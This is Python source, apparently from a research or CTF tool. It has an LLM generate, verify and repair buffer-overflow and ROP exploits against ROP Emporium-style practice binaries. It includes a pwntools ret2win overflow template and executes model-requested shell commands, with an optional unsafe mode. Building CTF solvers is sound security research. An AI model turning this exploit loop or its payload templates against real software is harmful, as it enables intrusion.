from __future__ import annotations

import traceback
from pathlib import Path
from time import perf_counter
import re
import ast

from .analysis import BinaryAnalyzer
from .config import PipelineConfig
from .llm_client import LLMClient, LLMError
from .generation import ExploitGenerator, GenerationParseError
from .local_tools import LocalCommandRunner, LocalToolRunner
from .schemas import VerificationResult
from .utils import ensure_dir, ensure_executable, sanitize_filename, utc_timestamp, write_json
from .verification import ExploitVerifier


class SolveOrchestrator:
    def __init__(self, config: PipelineConfig, prompt_template_path: Path | None = None) -> None:
        self.config = config
        self.analyzer = BinaryAnalyzer()
        self.verifier = ExploitVerifier(config)
        self.client = LLMClient(config)
        self.generator = ExploitGenerator(self.client, prompt_template_path=prompt_template_path)
        self.tool_runner = LocalToolRunner()
        self.command_runner = LocalCommandRunner(
            allow_unsafe=config.allow_unsafe_model_commands
        )

    def solve(
        self,
        binary_path: Path,
        success_regex: list[str] | None = None,
        max_iterations: int | None = None,
        strict_output: bool | None = None,
        enable_pruning: bool | None = None,
    ) -> dict:
        binary_path = binary_path.resolve()
        ensure_executable(binary_path)
        iterations = max_iterations or self.config.max_iterations
        inner_rounds = self.config.max_inner_rounds_per_attempt
        strict = self.config.strict_output if strict_output is None else strict_output
        prune = self.config.enable_pruning if enable_pruning is None else enable_pruning
        print(f"[solving] {binary_path.name}", flush=True)

        run_id = f"{sanitize_filename(binary_path.stem)}_{utc_timestamp().replace(':', '-')}"
        run_dir = self.config.artifact_root / run_id
        ensure_dir(run_dir)

        t0 = perf_counter()
        analysis_report = self.analyzer.analyze(binary_path, prune=prune)
        analysis_path = run_dir / "AnalysisReport.json"
        write_json(analysis_path, analysis_report.to_dict())

        feedback: dict = {
            "message": "first attempt; no previous verification feedback",
            "attempt": 0,
        }
        attempt_logs = []
        attempt_history: list[dict] = []
        solved = False
        success_attempt = None
        success_round = None
        last_error = ""
        previous_code = ""
        reflection_text = ""
        tool_results_text = _collect_bootstrap_evidence(
            binary_path=binary_path,
            analysis=analysis_report.to_dict(),
            tool_runner=self.tool_runner,
            command_runner=self.command_runner,
        )
        auto_facts_text = _derive_auto_facts(analysis_report.to_dict(), tool_results_text)
        if auto_facts_text:
            tool_results_text = f"AUTO FACTS\n{auto_facts_text}\n\nRAW EVIDENCE\n{tool_results_text}"
        (run_dir / "BootstrapEvidence.txt").write_text(tool_results_text, encoding="utf-8")
        if auto_facts_text:
            (run_dir / "AutoFacts.txt").write_text(auto_facts_text, encoding="utf-8")
        exploit_plan_text = "<no exploit plan>"
        attempts_used = 0

        heuristic_code = _build_heuristic_exploit(analysis_report.to_dict())
        start_attempt = 1
        if heuristic_code:
            attempts_used = 1
            print(f"[solving] {binary_path.name}: attempt 1 heuristic", flush=True)
            attempt_dir = run_dir / "attempt_01"
            ensure_dir(attempt_dir)
            exploit_path = attempt_dir / "exploit.py"
            exploit_path.write_text(heuristic_code + "\n", encoding="utf-8")
            heuristic_strategy = _infer_heuristic_strategy(heuristic_code)
            heuristic_payload = {
                "strategy": heuristic_strategy,
                "code": heuristic_code,
                "success_conditions": "Send extracted candidate input and observe WIN/FLAG markers.",
                "raw_text": "heuristic_pre_llm_attempt",
                "used_format_repair": False,
            }
            write_json(attempt_dir / "GenerationResult.json", heuristic_payload)
            ver = self.verifier.verify(
                binary_path=binary_path,
                exploit_path=exploit_path,
                attempt=1,
                success_regex=success_regex,
            )
            ver.artifacts = {
                "exploit_path": str(exploit_path.resolve()),
                "attempt_dir": str(attempt_dir.resolve()),
            }
            write_json(attempt_dir / "VerificationResult.json", ver.to_dict())
            attempt_logs.append(
                {
                    "attempt": 1,
                    "generation_used_format_repair": False,
                    "verification_status": ver.status,
                    "failure_reason": ver.failure_reason,
                    "success_reason": ver.success_reason,
                    "strategy": heuristic_strategy,
                }
            )
            attempt_history.append(
                {
                    "attempt": 1,
                    "phase": "heuristic",
                    "strategy": heuristic_strategy,
                    "status": ver.status,
                    "failure_reason": ver.failure_reason,
                    "success_reason": ver.success_reason,
                }
            )
            if ver.status == "success":
                solved = True
                success_attempt = 1
                success_round = 1
                print(f"[solving] {binary_path.name}: solved on heuristic attempt", flush=True)
            else:
                print(
                    f"[solving] {binary_path.name}: heuristic failed - {ver.failure_reason}",
                    flush=True,
                )
                feedback = ver.feedback_payload
                last_error = ver.failure_reason
                previous_code = heuristic_code
                start_attempt = 2

        for attempt in range(start_attempt, iterations + 1):
            if solved:
                break
            attempts_used = attempt
            attempt_dir = run_dir / f"attempt_{attempt:02d}"
            ensure_dir(attempt_dir)
            attempt_feedback = feedback
            attempt_previous_code = previous_code
            attempt_reflection_text = reflection_text
            attempt_tool_results_text = tool_results_text
            attempt_exploit_plan_text = exploit_plan_text

            for round_idx in range(1, inner_rounds + 1):
                round_dir = attempt_dir / f"round_{round_idx:02d}"
                ensure_dir(round_dir)
                generation_payload = {}

                try:
                    print(
                        f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} llm",
                        flush=True,
                    )
                    if attempt_previous_code or attempt_history:
                        print(
                            f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} reflection",
                            flush=True,
                        )
                        attempt_reflection_text = self.generator.reflect(
                            analysis=analysis_report.to_dict(),
                            attempt=attempt,
                            feedback=attempt_feedback,
                            previous_code=attempt_previous_code,
                            attempt_history=attempt_history,
                        )
                        (round_dir / "Reflection.txt").write_text(
                            attempt_reflection_text, encoding="utf-8"
                        )
                        (attempt_dir / "Reflection.txt").write_text(
                            attempt_reflection_text, encoding="utf-8"
                        )
                    tool_plan = self.generator.plan_tools(
                        analysis=analysis_report.to_dict(),
                        attempt=attempt,
                        feedback=attempt_feedback,
                        previous_code=attempt_previous_code,
                        reflection_text=attempt_reflection_text,
                        attempt_history=attempt_history,
                        previous_tool_results=attempt_tool_results_text,
                    )
                    tool_results = self.tool_runner.run_requests(
                        binary_path=binary_path,
                        requests=tool_plan.get("tool_requests", []),
                    )
                    command_results = self.command_runner.run_requests(
                        binary_path=binary_path,
                        requests=tool_plan.get("command_requests", []),
                    )
                    shell_results = self.command_runner.run_requests(
                        binary_path=binary_path,
                        requests=[
                            {"command": "shell", "args": {"command": item.get("command", "")}}
                            for item in tool_plan.get("shell_requests", [])
                        ],
                    )
                    tool_summary = self.tool_runner.summarize_results(tool_results)
                    command_summary = self.command_runner.summarize_results(
                        command_results + shell_results
                    )
                    current_tool_results_text = (
                        f"{tool_summary}\n\n{command_summary}".strip()
                        if tool_results or command_results or shell_results
                        else ""
                    )
                    if current_tool_results_text:
                        if (
                            attempt_tool_results_text
                            and attempt_tool_results_text not in {"<no local tool results>", "<no bootstrap evidence>"}
                        ):
                            attempt_tool_results_text = (
                                f"{attempt_tool_results_text}\n\nNEW ROUND RESULTS\n{current_tool_results_text}"
                            ).strip()
                        else:
                            attempt_tool_results_text = current_tool_results_text
                    write_json(round_dir / "ToolPlan.json", tool_plan)
                    write_json(
                        round_dir / "ToolResults.json",
                        {
                            "tool_results": tool_results,
                            "command_results": command_results,
                            "shell_results": shell_results,
                        },
                    )
                    write_json(attempt_dir / "ToolPlan.json", tool_plan)
                    write_json(
                        attempt_dir / "ToolResults.json",
                        {
                            "tool_results": tool_results,
                            "command_results": command_results,
                            "shell_results": shell_results,
                        },
                    )
                    (round_dir / "ToolResults.txt").write_text(
                        attempt_tool_results_text, encoding="utf-8"
                    )
                    (attempt_dir / "ToolResults.txt").write_text(
                        attempt_tool_results_text, encoding="utf-8"
                    )
                    attempt_exploit_plan_text = self.generator.plan_exploit(
                        analysis=analysis_report.to_dict(),
                        attempt=attempt,
                        feedback=attempt_feedback,
                        previous_code=attempt_previous_code,
                        reflection_text=attempt_reflection_text,
                        tool_results_text=attempt_tool_results_text,
                        attempt_history=attempt_history,
                    )
                    (round_dir / "ExploitPlan.txt").write_text(
                        attempt_exploit_plan_text, encoding="utf-8"
                    )
                    (attempt_dir / "ExploitPlan.txt").write_text(
                        attempt_exploit_plan_text, encoding="utf-8"
                    )

                    challenge_class = (
                        analysis_report.to_dict().get("helper_insights", {}).get("challenge_class")
                    )
                    scaffold_mode = challenge_class in {"pivot", "fluff", "ret2csu"}
                    if scaffold_mode:
                        used_direct_repair = False
                        try:
                            if attempt_previous_code and _should_try_direct_runtime_repair(attempt_feedback):
                                used_direct_repair = True
                                generation = self.generator.repair_runtime_issue(
                                    code=attempt_previous_code,
                                    verification_feedback=attempt_feedback,
                                    analysis=analysis_report.to_dict(),
                                    attempt=attempt,
                                    reflection_text=attempt_reflection_text,
                                    tool_results_text=attempt_tool_results_text,
                                    scaffold_mode=True,
                                )
                            elif attempt_previous_code and _should_try_direct_code_repair(attempt_feedback):
                                used_direct_repair = True
                                generation = self.generator.repair_code_quality(
                                    code=attempt_previous_code,
                                    issue=str(attempt_feedback.get("error", "")),
                                    analysis=analysis_report.to_dict(),
                                    attempt=attempt,
                                    feedback=attempt_feedback,
                                    reflection_text=attempt_reflection_text,
                                    tool_results_text=attempt_tool_results_text,
                                    scaffold_mode=True,
                                )
                            else:
                                generation = self.generator.generate_scaffolded(
                                    analysis=analysis_report.to_dict(),
                                    attempt=attempt,
                                    feedback=attempt_feedback,
                                    attempt_history=attempt_history,
                                    previous_code=attempt_previous_code,
                                    reflection_text=attempt_reflection_text,
                                    tool_results_text=attempt_tool_results_text,
                                    exploit_plan_text=attempt_exploit_plan_text,
                                )
                        except (LLMError, GenerationParseError):
                            if not used_direct_repair:
                                raise
                            generation = self.generator.generate_scaffolded(
                                analysis=analysis_report.to_dict(),
                                attempt=attempt,
                                feedback=attempt_feedback,
                                attempt_history=attempt_history,
                                previous_code=attempt_previous_code,
                                reflection_text=attempt_reflection_text,
                                tool_results_text=attempt_tool_results_text,
                                exploit_plan_text=attempt_exploit_plan_text,
                            )
                    else:
                        generation = self.generator.generate(
                            analysis=analysis_report.to_dict(),
                            attempt=attempt,
                            feedback=attempt_feedback,
                            strict_output=strict,
                            attempt_history=attempt_history,
                            previous_code=attempt_previous_code,
                            reflection_text=attempt_reflection_text,
                            tool_results_text=attempt_tool_results_text,
                            exploit_plan_text=attempt_exploit_plan_text,
                        )
                    generation_payload = generation.to_dict()
                    generation_payload["round"] = round_idx
                    write_json(round_dir / "GenerationResult.json", generation_payload)
                    write_json(attempt_dir / "GenerationResult.json", generation_payload)
                    (round_dir / "raw_model_output.txt").write_text(
                        generation.raw_text, encoding="utf-8"
                    )
                    (attempt_dir / "raw_model_output.txt").write_text(
                        generation.raw_text, encoding="utf-8"
                    )
                    prepared_code = _prepare_generated_code(generation.code)
                    exploit_path = round_dir / "exploit.py"
                    exploit_path.write_text(prepared_code + "\n", encoding="utf-8")
                    (attempt_dir / "exploit.py").write_text(prepared_code + "\n", encoding="utf-8")
                    attempt_previous_code = prepared_code

                    code_quality_issue = _detect_code_quality_issue(
                        prepared_code,
                        analysis_report.to_dict().get("helper_insights", {}).get("challenge_class"),
                    )
                    if code_quality_issue:
                        repair_issue = code_quality_issue
                        for _ in range(3):
                            try:
                                repaired = self.generator.repair_code_quality(
                                    code=prepared_code,
                                    issue=repair_issue,
                                analysis=analysis_report.to_dict(),
                                attempt=attempt,
                                feedback=attempt_feedback,
                                reflection_text=attempt_reflection_text,
                                tool_results_text=attempt_tool_results_text,
                                scaffold_mode=scaffold_mode,
                            )
                            except (LLMError, GenerationParseError):
                                break

                            generation = repaired
                            generation_payload = generation.to_dict()
                            generation_payload["round"] = round_idx
                            write_json(round_dir / "GenerationResult.json", generation_payload)
                            write_json(attempt_dir / "GenerationResult.json", generation_payload)
                            (round_dir / "raw_model_output.txt").write_text(
                                generation.raw_text, encoding="utf-8"
                            )
                            (attempt_dir / "raw_model_output.txt").write_text(
                                generation.raw_text, encoding="utf-8"
                            )
                            prepared_code = _prepare_generated_code(generation.code)
                            exploit_path.write_text(prepared_code + "\n", encoding="utf-8")
                            (attempt_dir / "exploit.py").write_text(prepared_code + "\n", encoding="utf-8")
                            attempt_previous_code = prepared_code
                            code_quality_issue = _detect_code_quality_issue(
                                prepared_code,
                                analysis_report.to_dict().get("helper_insights", {}).get("challenge_class"),
                            )
                            if not code_quality_issue:
                                break
                            repair_issue = code_quality_issue

                    if code_quality_issue:
                        issue = {
                            "attempt": attempt,
                            "round": round_idx,
                            "status": "generation_rejected",
                            "error": code_quality_issue,
                        }
                        write_json(round_dir / "GenerationFailure.json", issue)
                        write_json(attempt_dir / "GenerationFailure.json", issue)
                        attempt_logs.append(issue)
                        print(
                            f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} rejected - {code_quality_issue}",
                            flush=True,
                        )
                        attempt_history.append(
                            {
                                "attempt": attempt,
                                "round": round_idx,
                                "phase": "generation",
                                "status": "rejected",
                                "failure_reason": code_quality_issue,
                                "reflection_summary": attempt_reflection_text,
                                "tool_results_summary": attempt_tool_results_text,
                            }
                        )
                        attempt_feedback = {
                            "attempt": attempt,
                            "round": round_idx,
                            "status": "generation_rejected",
                            "error": code_quality_issue,
                            "instruction": (
                                "produce concrete runnable code without placeholders and make "
                                "sure the script executes the target and prints its output"
                            ),
                        }
                        last_error = code_quality_issue
                        continue
                except (LLMError, GenerationParseError) as exc:
                    err = {
                        "attempt": attempt,
                        "round": round_idx,
                        "status": "generation_failed",
                        "error": str(exc),
                        "traceback": traceback.format_exc(limit=3),
                    }
                    write_json(round_dir / "GenerationFailure.json", err)
                    write_json(attempt_dir / "GenerationFailure.json", err)
                    attempt_logs.append(err)
                    print(
                        f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} generation failed - {exc}",
                        flush=True,
                    )
                    attempt_history.append(
                        {
                            "attempt": attempt,
                            "round": round_idx,
                            "phase": "generation",
                            "status": "failed",
                            "failure_reason": str(exc),
                            "reflection_summary": attempt_reflection_text,
                            "tool_results_summary": attempt_tool_results_text,
                        }
                    )
                    attempt_feedback = {
                        "attempt": attempt,
                        "round": round_idx,
                        "status": "generation_failed",
                        "error": str(exc),
                        "instruction": (
                            "repair output format and provide runnable exploit code that "
                            "executes the binary and captures output"
                        ),
                    }
                    last_error = str(exc)
                    continue
                except Exception as exc:  # noqa: BLE001
                    err = {
                        "attempt": attempt,
                        "round": round_idx,
                        "status": "unexpected_generation_error",
                        "error": str(exc),
                        "traceback": traceback.format_exc(limit=6),
                    }
                    write_json(round_dir / "GenerationFailure.json", err)
                    write_json(attempt_dir / "GenerationFailure.json", err)
                    attempt_logs.append(err)
                    print(
                        f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} unexpected generation error - {exc}",
                        flush=True,
                    )
                    attempt_history.append(
                        {
                            "attempt": attempt,
                            "round": round_idx,
                            "phase": "generation",
                            "status": "unexpected_error",
                            "failure_reason": str(exc),
                            "reflection_summary": attempt_reflection_text,
                            "tool_results_summary": attempt_tool_results_text,
                        }
                    )
                    attempt_feedback = {
                        "attempt": attempt,
                        "round": round_idx,
                        "status": "unexpected_generation_error",
                        "error": str(exc),
                    }
                    last_error = str(exc)
                    continue

                ver: VerificationResult = self.verifier.verify(
                    binary_path=binary_path,
                    exploit_path=exploit_path,
                    attempt=attempt,
                    success_regex=success_regex,
                )
                ver.artifacts = {
                    "exploit_path": str(exploit_path.resolve()),
                    "attempt_dir": str(round_dir.resolve()),
                    "outer_attempt_dir": str(attempt_dir.resolve()),
                }
                ver_payload = ver.to_dict()
                ver_payload["round"] = round_idx
                write_json(round_dir / "VerificationResult.json", ver_payload)
                write_json(attempt_dir / "VerificationResult.json", ver_payload)

                if _should_try_runtime_repair(ver):
                    try:
                        repaired = self.generator.repair_runtime_issue(
                            code=prepared_code,
                            verification_feedback=ver.feedback_payload,
                            analysis=analysis_report.to_dict(),
                            attempt=attempt,
                            reflection_text=attempt_reflection_text,
                            tool_results_text=attempt_tool_results_text,
                            scaffold_mode=scaffold_mode,
                        )
                        generation = repaired
                        generation_payload = generation.to_dict()
                        generation_payload["round"] = round_idx
                        generation_payload["runtime_repair_used"] = True
                        write_json(round_dir / "GenerationResult.json", generation_payload)
                        write_json(attempt_dir / "GenerationResult.json", generation_payload)
                        (round_dir / "raw_model_output.txt").write_text(
                            generation.raw_text, encoding="utf-8"
                        )
                        (attempt_dir / "raw_model_output.txt").write_text(
                            generation.raw_text, encoding="utf-8"
                        )
                        prepared_code = _prepare_generated_code(generation.code)
                        exploit_path.write_text(prepared_code + "\n", encoding="utf-8")
                        (attempt_dir / "exploit.py").write_text(prepared_code + "\n", encoding="utf-8")
                        attempt_previous_code = prepared_code

                        repair_issue = _detect_code_quality_issue(
                            prepared_code,
                            analysis_report.to_dict().get("helper_insights", {}).get("challenge_class"),
                        )
                        if not repair_issue:
                            ver = self.verifier.verify(
                                binary_path=binary_path,
                                exploit_path=exploit_path,
                                attempt=attempt,
                                success_regex=success_regex,
                            )
                            ver.artifacts = {
                                "exploit_path": str(exploit_path.resolve()),
                                "attempt_dir": str(round_dir.resolve()),
                                "outer_attempt_dir": str(attempt_dir.resolve()),
                            }
                            ver_payload = ver.to_dict()
                            ver_payload["round"] = round_idx
                            ver_payload["runtime_repair_used"] = True
                            write_json(round_dir / "VerificationResult.json", ver_payload)
                            write_json(attempt_dir / "VerificationResult.json", ver_payload)
                    except (LLMError, GenerationParseError):
                        pass

                log_item = {
                    "attempt": attempt,
                    "round": round_idx,
                    "generation_used_format_repair": generation_payload.get("used_format_repair", False),
                    "verification_status": ver.status,
                    "failure_reason": ver.failure_reason,
                    "success_reason": ver.success_reason,
                }
                attempt_logs.append(log_item)
                attempt_history.append(
                    {
                        "attempt": attempt,
                        "round": round_idx,
                        "phase": "verification",
                        "status": ver.status,
                        "failure_reason": ver.failure_reason,
                        "success_reason": ver.success_reason,
                        "reflection_summary": attempt_reflection_text,
                        "tool_results_summary": attempt_tool_results_text,
                    }
                )

                if ver.status == "success":
                    solved = True
                    success_attempt = attempt
                    success_round = round_idx
                    print(
                        f"[solving] {binary_path.name}: solved on attempt {attempt} round {round_idx}",
                        flush=True,
                    )
                    break

                attempt_feedback = ver.feedback_payload
                last_error = ver.failure_reason
                print(
                    f"[solving] {binary_path.name}: attempt {attempt} round {round_idx} failed - {ver.failure_reason}",
                    flush=True,
                )

            feedback = attempt_feedback
            previous_code = attempt_previous_code
            reflection_text = attempt_reflection_text
            tool_results_text = attempt_tool_results_text
            exploit_plan_text = attempt_exploit_plan_text

        elapsed = perf_counter() - t0
        summary = {
            "binary_path": str(binary_path),
            "run_dir": str(run_dir.resolve()),
            "solved": solved,
            "success_attempt": success_attempt,
            "success_round": success_round,
            "attempts_used": attempts_used,
            "max_iterations": iterations,
            "max_inner_rounds_per_attempt": inner_rounds,
            "elapsed_seconds": round(elapsed, 3),
            "strict_output": strict,
            "enable_pruning": prune,
            "last_error": last_error,
            "attempt_logs": attempt_logs,
        }
        write_json(run_dir / "run_summary.json", summary)
        final_status = "SOLVED" if solved else "FAILED"
        print(f"[solving] {binary_path.name}: {final_status}", flush=True)
        return summary


def _detect_code_quality_issue(code: str, challenge_class: str | None = None) -> str | None:
    try:
        ast.parse(code)
    except SyntaxError as exc:
        return f"Generated exploit has Python syntax error: {exc.msg} at line {exc.lineno}"

    placeholders = [
        "CORRECT_CODE_HERE",
        "CORRECT_CODE",
        "REQUIRED_CODE",
        "TODO",
        "FILL_ME",
        "REPLACE_ME",
        "<PLACEHOLDER>",
    ]
    for token in placeholders:
        if token in code:
            return f"Generated exploit contains unresolved placeholder: {token}"
    hardcoded_path_hints = [
        "./branch_puzzle",
        "./chall",
        "./challenge",
        "./binary",
    ]
    for token in hardcoded_path_hints:
        if token in code:
            return f"Generated exploit hardcodes target path instead of using argv: {token}"
    execution_markers = ["subprocess.Popen", "subprocess.run", "process(", "remote(", ".communicate(", ".recvall("]
    if not any(marker in code for marker in execution_markers):
        return "Generated exploit does not appear to execute the target or capture output."
    family_issue = _detect_family_completion_issue(code, challenge_class)
    if family_issue:
        return family_issue
    return None


def _detect_family_completion_issue(code: str, challenge_class: str | None) -> str | None:
    lowered = code.lower()
    send_ops = sum(lowered.count(token) for token in (".send(", ".sendline(", ".sendafter(", ".sendlineafter("))

    if challenge_class == "pivot":
        missing = []
        if "foothold" not in lowered or ".got['foothold_function']" not in lowered:
            missing.append("foothold_function resolution")
        ret2win_markers = (
            "ret2win_addr",
            "symbols['ret2win']",
            'symbols["ret2win"]',
            "ret2win_offset",
            "libpivot_base",
        )
        if not any(marker in lowered for marker in ret2win_markers):
            missing.append("ret2win computation/call")
        if send_ops < 2:
            missing.append("both stage-1 and stage-2 payload sends")
        if missing:
            return (
                "Pivot-family exploit is incomplete: missing "
                + ", ".join(missing)
                + ". Use the leaked pivot address, resolve ret2win via foothold/libpivot, and send both payload stages."
            )

    if challenge_class == "ret2csu":
        if "__libc_csu_init" not in lowered and "csu" not in lowered:
            return "ret2csu-family exploit is incomplete: it does not reference the CSU dispatcher gadgets."

    if challenge_class == "fluff":
        if "print_file" not in lowered or "flag.txt" not in lowered:
            return "Fluff-family exploit is incomplete: it should write flag.txt into memory and call print_file."

    return None


def _should_try_runtime_repair(ver: VerificationResult) -> bool:
    if ver.status != "failed":
        return False
    if ver.exit_code is None:
        return False
    text = f"{ver.stdout_tail}\n{ver.stderr_tail}"
    actionable_markers = [
        "traceback",
        "assertionerror",
        "keyerror",
        "valueerror",
        "typeerror",
        "pwnlib",
        "byteswarning",
        "sigsegv",
        "segmentation fault",
        "stopped with exit code -11",
        "struct.error",
        "unpack requires a buffer",
    ]
    lowered = text.lower()
    return any(marker in lowered for marker in actionable_markers)


def _should_try_direct_runtime_repair(feedback: dict) -> bool:
    if not isinstance(feedback, dict):
        return False
    status = str(feedback.get("status", "")).lower()
    if status not in {"failed", "timeout"}:
        return False
    text = "\n".join(
        str(feedback.get(key, ""))
        for key in ("stderr_tail", "stdout_tail", "failure_reason", "error")
    ).lower()
    actionable_markers = (
        "traceback",
        "assertionerror",
        "keyerror",
        "valueerror",
        "typeerror",
        "byteswarning",
        "struct.error",
        "unpack requires a buffer",
        "stopped process",
        "sigsegv",
        "segmentation fault",
        "stopped with exit code -11",
        "timed out",
    )
    return any(marker in text for marker in actionable_markers)


def _should_try_direct_code_repair(feedback: dict) -> bool:
    if not isinstance(feedback, dict):
        return False
    status = str(feedback.get("status", "")).lower()
    if status not in {"generation_rejected", "generation_failed"}:
        return False
    error = str(feedback.get("error", "")).strip()
    return bool(error)


def _prepare_generated_code(code: str) -> str:
    prepared = code.rstrip()
    try:
        tree = ast.parse(prepared)
    except SyntaxError:
        return prepared

    function_defs = {
        node.name: node
        for node in tree.body
        if isinstance(node, ast.FunctionDef)
    }
    if not function_defs:
        return prepared

    if "__name__" in prepared and "__main__" in prepared:
        return prepared

    bootstrap = ""
    preferred_name = None
    for candidate in ("main", "exploit", "solve", "run"):
        if candidate in function_defs:
            preferred_name = candidate
            break
    if preferred_name is None and len(function_defs) == 1:
        preferred_name = next(iter(function_defs))

    if preferred_name == "main":
        bootstrap = "\n\nif __name__ == '__main__':\n    main()\n"
    elif preferred_name is not None:
        arg_count = len(function_defs[preferred_name].args.args)
        if arg_count == 0:
            bootstrap = f"\n\nif __name__ == '__main__':\n    {preferred_name}()\n"
        elif arg_count == 1:
            bootstrap = (
                "\n\nif __name__ == '__main__':\n"
                "    import argparse\n"
                "    import os\n"
                "    parser = argparse.ArgumentParser()\n"
                "    parser.add_argument('binary', nargs='?', default=None)\n"
                "    parser.add_argument('--binary', dest='binary_flag', default=None)\n"
                "    args = parser.parse_args()\n"
                "    binary = args.binary_flag or args.binary or os.environ.get('TARGET_BINARY')\n"
                "    if not binary:\n"
                "        raise SystemExit('missing binary path')\n"
                f"    {preferred_name}(binary)\n"
            )
    if bootstrap:
        return prepared + bootstrap
    return prepared


def _collect_bootstrap_evidence(
    binary_path: Path,
    analysis: dict,
    tool_runner: LocalToolRunner,
    command_runner: LocalCommandRunner,
) -> str:
    helper = analysis.get("helper_insights", {})
    bundle = helper.get("bootstrap_bundle", {}) if isinstance(helper, dict) else {}
    tool_requests = bundle.get("tool_requests", []) or []
    command_requests = bundle.get("command_requests", []) or []

    tool_results: list[dict] = []
    for start in range(0, len(tool_requests), 3):
        tool_results += tool_runner.run_requests(
            binary_path=binary_path,
            requests=tool_requests[start : start + 3],
        )

    command_results: list[dict] = []
    for start in range(0, len(command_requests), 2):
        command_results += command_runner.run_requests(
            binary_path=binary_path,
            requests=command_requests[start : start + 2],
        )
    tool_summary = tool_runner.summarize_results(tool_results)
    command_summary = command_runner.summarize_results(command_results)
    merged = f"{tool_summary}\n\n{command_summary}".strip()
    return merged or "<no bootstrap evidence>"


def _derive_auto_facts(analysis: dict, bootstrap_text: str) -> str:
    helper = analysis.get("helper_insights", {}) if isinstance(analysis, dict) else {}
    challenge_class = helper.get("challenge_class", "unknown")
    facts: list[str] = []

    runtime_dir_match = re.search(r"runtime_dir:\s*(.+)", bootstrap_text)
    if runtime_dir_match:
        facts.append(f"runtime_dir={runtime_dir_match.group(1).strip()}")

    if "libpivot.so" in bootstrap_text:
        facts.append("A sidecar library libpivot.so exists in the runtime directory.")
    if "flag.txt" in bootstrap_text:
        facts.append("A flag.txt file exists in the runtime directory.")

    if challenge_class == "pivot":
        if "UND foothold_function" in bootstrap_text or "foothold_function + 0" in bootstrap_text:
            facts.append("foothold_function is imported through PLT/GOT; it is not the final target.")
        if "ret2win" not in bootstrap_text:
            facts.append("ret2win is not exported by the main binary; do not assume elf.symbols['ret2win'] exists.")
        useful_match = re.search(r"usefulGadgets\s*\n?\s*.*?4009bb", bootstrap_text, re.DOTALL)
        if useful_match or "4009bb" in bootstrap_text:
            facts.append("pop rax; ret is available at 0x4009bb.")
        if "4009bd" in bootstrap_text:
            facts.append("xchg rsp, rax; ret is available at 0x4009bd.")
        if "The Old Gods kindly bestow upon you a place to pivot" in bootstrap_text:
            facts.append("The binary leaks a pivot address at startup before asking for the first ROP chain.")
        if "Send a ROP chain now and it will land there" in bootstrap_text:
            facts.append("The binary expects a first-stage ROP chain followed by a separate stack-smash payload.")

    if challenge_class == "ret2csu":
        if "__libc_csu_init" in bootstrap_text:
            facts.append("Use __libc_csu_init gadgets instead of guessing ad-hoc pop gadgets.")
    if challenge_class == "fluff":
        for needle in ("xlat", "bextr", "stos"):
            if needle in bootstrap_text:
                facts.append(f"The constrained gadget family includes `{needle}`.")

    deduped: list[str] = []
    for fact in facts:
        if fact not in deduped:
            deduped.append(fact)
    return "\n".join(f"- {item}" for item in deduped)


def _build_heuristic_exploit(analysis: dict) -> str | None:
    rop_heuristic = _build_ret2win_heuristic(analysis)
    if rop_heuristic:
        return rop_heuristic

    split_heuristic = _build_split_heuristic(analysis)
    if split_heuristic:
        return split_heuristic

    callme_heuristic = _build_callme_heuristic(analysis)
    if callme_heuristic:
        return callme_heuristic

    write4_heuristic = _build_write4_heuristic(analysis)
    if write4_heuristic:
        return write4_heuristic

    badchars_heuristic = _build_badchars_heuristic(analysis)
    if badchars_heuristic:
        return badchars_heuristic

    branch_heuristic = _build_branch_input_heuristic(analysis)
    if branch_heuristic:
        return branch_heuristic

    return None


def _build_branch_input_heuristic(analysis: dict) -> str | None:
    strings = analysis.get("interesting_strings", [])
    text_blob = "\n".join(strings)
    if "stack buffer" in text_blob or "pwnme" in text_blob or "ret2win" in text_blob:
        return None

    markers = {"WIN", "Nope", "Say the course code:"}
    candidates = []
    for s in strings:
        if s in markers:
            continue
        if not re.fullmatch(r"[A-Za-z0-9_{}-]{4,64}", s):
            continue
        if s.startswith("GLIBC_") or s.startswith("__") or "/" in s:
            continue
        candidates.append(s)

    if not candidates:
        return None

    preferred = None
    for s in candidates:
        if any(ch.isdigit() for ch in s) and any(ch.isalpha() for ch in s):
            preferred = s
            break
    if preferred is None:
        preferred = candidates[0]

    payload = preferred.encode("utf-8")
    payload_repr = repr(payload + b"\n")

    return f"""import argparse
import subprocess


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=False,
    )
    stdout, stderr = proc.communicate(input={payload_repr}, timeout=5)
    if stdout:
        print(stdout.decode(errors="replace"))
    if stderr:
        print(stderr.decode(errors="replace"))


if __name__ == "__main__":
    main()
"""


def _build_ret2win_heuristic(analysis: dict) -> str | None:
    if analysis.get("binary_name") != "rop_ret2win":
        return None

    exports = set(analysis.get("exports", []))
    pruned_context = analysis.get("pruned_context", [])
    context_blob = "\n".join(item.get("snippet", "") for item in pruned_context)
    strings_blob = "\n".join(analysis.get("interesting_strings", []))

    target_symbol = None
    for candidate in ("ret2win", "win"):
        if candidate in exports or f"<{candidate}>:" in context_blob:
            target_symbol = candidate
            break

    if target_symbol is None:
        return None

    if "stack buffer" not in strings_blob and "read()" not in strings_blob and "gets" not in context_blob:
        return None

    return f"""import argparse
import re
from pwn import ELF, ROP, context, p64, process


def run_once(binary_path, payload):
    target = process(binary_path)
    target.sendline(payload)
    data = target.recvall(timeout=2)
    output = data.decode(errors="replace")
    print(output)
    return output


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    elf = ELF(binary, checksec=False)
    context.binary = elf
    rop = ROP(elf)
    win_addr = elf.symbols["{target_symbol}"]
    ret_gadget = None
    try:
        ret_gadget = rop.find_gadget(["ret"]).address
    except Exception:
        ret_gadget = None

    for offset in (24, 32, 40, 44, 48, 56, 64, 72):
        payloads = [b"A" * offset + p64(win_addr)]
        if ret_gadget is not None:
